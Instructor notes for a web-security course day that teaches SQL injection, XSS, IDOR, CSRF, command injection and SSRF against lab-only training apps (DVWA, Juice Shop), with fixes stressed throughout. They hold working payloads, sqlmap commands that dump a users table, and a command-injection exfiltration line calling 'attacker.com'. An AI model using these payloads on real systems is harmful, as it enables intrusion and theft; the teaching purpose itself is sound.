# Day 16 — Teacher Notes

**Teach from:** `day16.md` (deck + speaker notes).
**This file:** lab setup, cut-list, background, the vuln-code answer key, demo runbook,
checkpoint, exit check, FAQ.

**Most hands-on day of the course.** The three DOs (SQLi, stored XSS, IDOR) are the spine.
Everything else supports them.

---

## Lab setup

- **DVWA** on `<LAB_HOST>` (own lab: `10.89.1.20`) — log in (`admin` / `password`), set
  **DVWA Security = Low** to start, bump to **Medium** during the SQLi DO to show filtering
  isn't the fix.
- **Juice Shop** on `<LAB_HOST>:3000` (own lab: `10.89.1.30`) — no setup; every challenge is live.
- **Burp Suite** — preinstalled on Kali. Students don't *need* it for the core DOs (DevTools +
  URL editing is enough), but demo the 2-minute version so they've seen it.
- Everything is against deliberately-vulnerable training apps in the ROE. Say it once.

---

## Lab tool map (this day) — see also Day 13's full table

| Target | Address | Tool | Technique |
|---|---|---|---|
| DVWA | `10.89.1.20` | manual (URL/form), then `sqlmap` | SQL injection: find by hand, then automate |
| DVWA | `10.89.1.20` | manual (DevTools/Burp) | Stored XSS, CSRF, Command Injection |
| Juice Shop | `10.89.1.30` | manual (DevTools Network tab) | IDOR via the REST API |

Same pattern as Day 13/14: manual first (so students understand *why* the bug exists), the
automated tool second (`sqlmap`) — never the reverse. DVWA's Command Injection page is this
day's bridge to **Day 17**: the same input-reaches-a-shell bug that gets you a foothold.

---

## The analogy — the order ticket (kitchen)

Untrusted input = an order ticket handed to the kitchen. If the kitchen does *whatever the
ticket says* — "table 4: two pastas AND unlock the safe AND comp the bill" — that's injection.
A **parameterized query** = a printed order form with fixed fields (dish, qty, table): the
customer fills **values**, and can never add an instruction. Output encoding = the waiter
reads the customer's note aloud as *text* ("the customer wrote: less-than b greater-than")
instead of acting on it.

---

## Must-teach vs. cut-if-short

**Never cut:**
- The **injection mechanism** (input concatenated into a query → data becomes code) + the SQLi DO.
- **XSS** types + impact (session theft) + the stored-XSS DO.
- **IDOR** — authentication ≠ authorization.
- The **structural fix** message: parameterize / encode / authorize, **not filter**.
- The **find / prove / fix** artifact.

**Cut in this order if behind:**
1. SSRF → one sentence ("app fetches a URL you give it → point it inward").
2. The Burp demo → 90 seconds, or skip (DevTools is enough today).
3. DOM XSS → mention it exists, don't demo.
4. The "#4 & #5" slide → keep broken-auth, drop SSRF.

---

## Background

### The web app model + tools
- Request → server code → (DB / files / other services / OS) → response. Each hop is a place
  input can reach a powerful sink.
- **DevTools** — inspect/replay via "Copy as cURL"; edit-and-resend in the Network tab.
- **Burp Suite** (Community): **Proxy** (intercept + modify in flight), **Repeater** (replay +
  tweak a request), **Intruder** (automate payloads — throttled in Community). Set the
  browser's proxy to `127.0.0.1:8080`, install Burp's CA cert for HTTPS. The everyday loop is
  Proxy → "send to Repeater" → edit → send.
- **`curl`** / a Python `requests` script (Day 9) for scripted testing.

### #1 Injection / SQLi
- Cause: a query is assembled by string concatenation, so input can alter the query's
  **structure**, not just its data.
- **Login bypass:** `' OR '1'='1' -- ` makes the WHERE always true; `-- ` (note trailing
  space) or `#` (MySQL) comments the rest.
- **UNION-based:** `' UNION SELECT col1, col2 FROM users -- ` — column count and types must
  match; `ORDER BY n` finds the count; `NULL`s pad types.
- **Blind:** no data echoed. **Boolean** — `' AND 1=1 -- ` vs `' AND 1=2 -- ` change the
  page. **Time-based** — `' OR SLEEP(5) -- ` / `WAITFOR DELAY`. `sqlmap` automates this
  (mention; don't teach the flags today).
- **Beyond data:** `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL → write a webshell), stacked
  queries → sometimes RCE.
- **Fix:** **parameterized queries / prepared statements** — the driver sends the query
  template and the parameters **separately**; the DB never parses a parameter as SQL. ORMs do
  this by default. *Not* fixed by escaping/blocklisting; *not* fully fixed by stored procedures
  if they build dynamic SQL inside.

### #2 XSS
- Cause: input is placed into a page and the browser parses it as HTML/JS.
- **Reflected** — in the response to a request that contained it (a search term in the results
  page); delivered via a crafted link.
- **Stored/persistent** — saved server-side (comment, profile, product review, log viewer),
  runs for **every** viewer. Worst in admin panels / support tools.
- **DOM-based** — the server response is fine; client JS takes `location.hash` /
  `document.referrer` / a URL param and writes it into the DOM (`innerHTML`, `document.write`,
  `eval`) unsafely.
- **Impact:** `document.cookie` theft (→ session hijack, Day 4), keylogging, CSRF-token theft,
  drive-by, phishing overlays, worming (Samy).
- **Fix (layered):**
  1. **Output encoding** — context-aware: HTML-body (`&lt;`), attribute, JS-string, URL, CSS
     each differ. Use the framework's auto-escaping template engine.
  2. **Content-Security-Policy** — `script-src 'self'` (no inline) blocks injected scripts;
     a strong CSP is the safety net.
  3. **HttpOnly** on session cookies — JS can't read them (blunts the classic payload).
  4. **Trusted Types** (modern browsers) — forces DOM sinks through a sanitiser.
- Input sanitisation libraries (DOMPurify) are for when you *must* allow some HTML (a rich-text
  comment) — otherwise encode.

### #3 Broken Access Control / IDOR
- **Authentication** = who you are. **Authorization** = what you're allowed. The bug: the app
  does the first, skips the second on a specific object/action.
- **IDOR** = Insecure Direct Object Reference — a user-supplied identifier (`?id=`, a path
  segment, a filename, a JWT claim) is used to fetch/modify a record with no ownership check.
- Also: **forced browsing** (`/admin`, `/api/v2/internal`), **privilege escalation via
  parameter** (`role`, `isAdmin`, `price`), **missing function-level access control** (the UI
  hides the button; the endpoint still works).
- **Fix:** enforce authorization **server-side, on every request**, against the **authenticated
  session** — never the client. Use non-guessable IDs (UUIDs) as defence in depth, but that's
  not the fix. Centralise the check (a policy layer / middleware), don't scatter it.
- OWASP **#1** because it's pervasive and **scanners can't find it** — it needs to know what
  *should* be allowed.

### #4 Broken Authentication / Session
- Weak/rate-unlimited login (credential stuffing — Day 11), weak "forgot password", predictable
  session IDs, session fixation, no logout invalidation, long-lived tokens, secrets/JWTs signed
  with `none` or a weak key, MFA that can be bypassed or fatigued.
- **Fix:** MFA (phishing-resistant ideally), lockout + rate-limit + anomaly detection,
  cryptographically random session IDs, rotate on privilege change, invalidate on logout,
  short lifetimes, `Secure`+`HttpOnly`+`SameSite`.

### Bonus: CSRF and Command Injection
Not drilled hands-on today (the day is already full) — covered as a concept slide, same
"untrusted input reached something powerful" pattern as everything else. If a student wants
hands-on practice, DVWA has a page for each.

**CSRF** — the browser's cookie-autopilot is the whole bug. It has nothing to do with stealing
a cookie (that's XSS/session-hijacking); it's *using* a cookie the victim's browser will attach
on its own. Teach it as a difficulty ladder:
1. **GET-based** — the attack is just a link or `<img src=...>`; if a sensitive action responds
   to GET, one visited page does it.
2. **POST-based** — needs an auto-submitting form on the attacker's page
   (`<form ... onload="this.submit()">`) since a plain link can't POST.
3. **Chained with XSS** — if the target has a reflected/stored XSS bug, the attacker doesn't
   even need the victim to visit *their* page — the payload can read the CSRF token off the
   page itself and forge the request from inside the trusted origin, defeating a token defence
   that isn't also paired with `SameSite`. This is why CSRF and XSS fixes are complementary,
   not either/or.
- **Fix, in order of strength:** `SameSite=Lax` (blocks cross-site cookie attachment for most
  cases, free, one cookie flag) → anti-CSRF token (a per-session secret the form must echo
  back, checked server-side) → re-authentication for high-value actions (transfers, password
  change, email change).

**Command injection** — same bug as SQLi, different sink (a shell, not a database). Teach it as
the same kind of difficulty ladder as SQLi's login-bypass/UNION/blind progression:
1. **Separator injection** — `;`, `|`, `&&`, backticks/`$(...)` chain a second command onto the
   first (`8.8.8.8; whoami`, `8.8.8.8 | whoami`).
2. **Breaking out of quotes** — if the app wraps input in `"..."`, closing the quote first
   (`" ; whoami ; "`) is needed before the separator works.
3. **Environment-variable injection** — some inputs land in an env var rather than an argument;
   `$IFS` substitutes for a space when the literal space character is filtered.
4. **Blind command injection** — no output is returned to you; prove it with a **side effect**
   you can observe out-of-band: `; sleep 5` (timing) or `; touch /tmp/pwned` /
   `curl attacker.com/$(whoami)` if you have a way to check afterward.
5. **Filter bypass** — once obvious payloads are blocked, look for what wasn't: a different
   separator, case variation, encoding, or building the payload from allowed fragments.
- **Fix:** never hand a string to a shell. Call the library function with an **argument list**
  and `shell=False` (Python `subprocess.run(["ping","-c","1",host])`) — there's no shell to
  break out of. If a shell truly can't be avoided, a strict allowlist of characters, not a
  blocklist.

(This difficulty-ladder structure mirrors how pwn.college's web-security module sequences its
CSRF and command-injection challenges — useful framing to reuse when writing quiz questions or
extra practice, even though we don't drill it hands-on today.)

### #5 SSRF
- The app takes a URL/host from the user and makes a **server-side** request to it (webhook,
  "import from URL", PDF-from-URL, image proxy, link preview).
- Attacker targets: `http://localhost/…`, `http://169.254.169.254/…` (AWS/GCP/Azure metadata —
  hands out **temporary cloud credentials** — huge in Day 17's cloud context), internal admin
  panels, port-scanning the internal network via response timing.
- **Fix:** allowlist exact destinations; resolve the hostname and **block private/link-local
  ranges** (and re-check after redirects — DNS rebinding); disable unused URL schemes
  (`file://`, `gopher://`); use a dedicated egress proxy; don't return the raw response body.

---

## `vuln-code.md` — answer key
- **A** = SQL injection (concatenation). Bypass: `admin' -- `. Fix: `?` placeholders binding
  `name` and `hash(pw)` as parameters.
- **B** = stored XSS (author + body into HTML unencoded). Attack: a `<script>` in `body`.
  Fix: `html.escape()` each field on output (or an auto-escaping template) + CSP + HttpOnly.

---

## Demo runbook

### Hook — SQLi login bypass
DVWA login won't do it (it's a static form); use the **DVWA "SQL Injection" page** with `' or
'1'='1` or **Juice Shop** login with email `' OR 1=1--` (any password) → logged in as the
first user (admin). "One quote."

### SQLi DO
- DVWA SQL Injection (Low): User ID `1' OR '1'='1' -- -` → all rows. Then
  `1' UNION SELECT user, password FROM users -- -` → usernames + password **hashes**.
- Switch DVWA to **Medium** (it does `mysqli_real_escape_string` + dropdown) — the naive
  payload fails; show a numeric-context payload still works → "escaping ≠ fixed".
- Juice Shop: `' OR 1=1--` login; then the "search" field for a UNION.
- **sqlmap demo (after the manual proof, first cut if the DO is running long):** `sqlmap -u "http://10.89.1.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session>" --dbs`, then
  `--dump -T users -D dvwa` to pull the table straight out. Point: same bug, same result,
  seconds instead of manual UNION crafting — *because they already know why it works.*

### Stored XSS DO
- DVWA XSS (Stored), Low: Name field is length-limited (edit `maxlength` in DevTools), Message:
  `<script>alert(document.cookie)</script>` → submit → **reload** → it fires.
- `<img src=x onerror=alert(document.domain)>` when `<script>` is stripped (Medium).
- Juice Shop: the "Customer Feedback" / search box; DOM XSS via the search parameter.

### IDOR DO
- Juice Shop: log in, add to basket, watch the API call in DevTools — `/rest/basket/<id>` —
  change `<id>` → another user's basket. Or `/api/Users/<id>`.
- DVWA has less IDOR; Juice Shop is better for this one.

### Failure modes
| Symptom | Fix |
|---|---|
| DVWA payload does nothing | check Security level; check you're on the *SQL Injection* page not login |
| `<script>` doesn't fire | try `<img onerror>`; check the field length (DevTools `maxlength`); reload the page |
| Juice Shop "0 results" for `' OR 1=1--` | it needs `--` with the right trailing char; try `'--` or `' OR true--` |
| Burp not intercepting HTTPS | install Burp's CA cert in the browser; or just use DevTools today |
| student attacks a real site | hard stop — DVWA / Juice Shop on `<LAB_HOST>` only |
| `sqlmap` finds nothing | check the `--cookie` has a valid `PHPSESSID` and `security=low`; DVWA session cookies expire — log in again |

---

## Checkpoint (by end of class)

Each student can:
- [ ] explain *why* `admin' --` logs you in (the query structure changed)
- [ ] name the structural fix for SQLi (parameterized query) and for XSS (output encoding + CSP)
- [ ] state the difference between authentication and authorization, and what IDOR exploits
- [ ] say why a blocklist of characters does **not** fix injection
- [ ] has proof screenshots for at least SQLi, XSS, and IDOR

---

## Exit check (last 2 min)

1. A dev "fixes" SQLi by removing `'` and `--` from input. Why isn't that enough? — *Encodings,
   alternate syntax, numeric contexts, double-encoding — filters get bypassed. Parameterize.*
2. Stored vs reflected XSS — which is worse and why? — *Stored — it's saved and runs for every
   viewer without them clicking anything.*
3. `/invoice?id=42` shows your invoice; `/invoice?id=41` shows someone else's. What's missing? —
   *A server-side authorization check that the logged-in user owns invoice 41.*

---

## FAQ

- **"Is `alert(1)` a real vulnerability?"** It's the *proof* that arbitrary JS runs. The real
  payload steals the session or acts as the user. Report the `alert` as evidence of XSS.
- **"React/Angular auto-escape — am I safe from XSS?"** Mostly, in templates. You reintroduce
  it with `dangerouslySetInnerHTML` / `[innerHTML]` / `bypassSecurityTrust*` / building HTML
  strings. And DOM XSS still applies.
- **"Do parameterized queries slow things down?"** No — they're often *faster* (query plan
  reuse). There's no performance excuse.
- **"What about NoSQL?"** NoSQL injection exists too (`{"$gt": ""}` in a Mongo query). Same
  principle: don't build queries from raw input; use the driver's parameterization.
- **"Is a WAF pointless then?"** No — it blocks opportunistic scanning and buys time during
  patching. It's a layer. The bug still needs a code fix.
- **"How is CSRF different from XSS if both end with the attacker acting as the user?"** XSS
  runs the attacker's code *inside* the trusted origin (it can read anything the page can, incl.
  the CSRF token). CSRF runs *outside* it and relies purely on the browser auto-attaching
  cookies to a forged request — it never touches the page's JavaScript context at all.
- **"Why doesn't `SameSite=Lax` fully solve CSRF?"** It blocks cross-site *cookie* attachment
  for most request types, but top-level GET navigations are still allowed by `Lax` (for normal
  links to work), and it does nothing if the attacker's payload runs via XSS from inside your
  own origin. Defense in depth: `SameSite` + token + re-auth for sensitive actions.
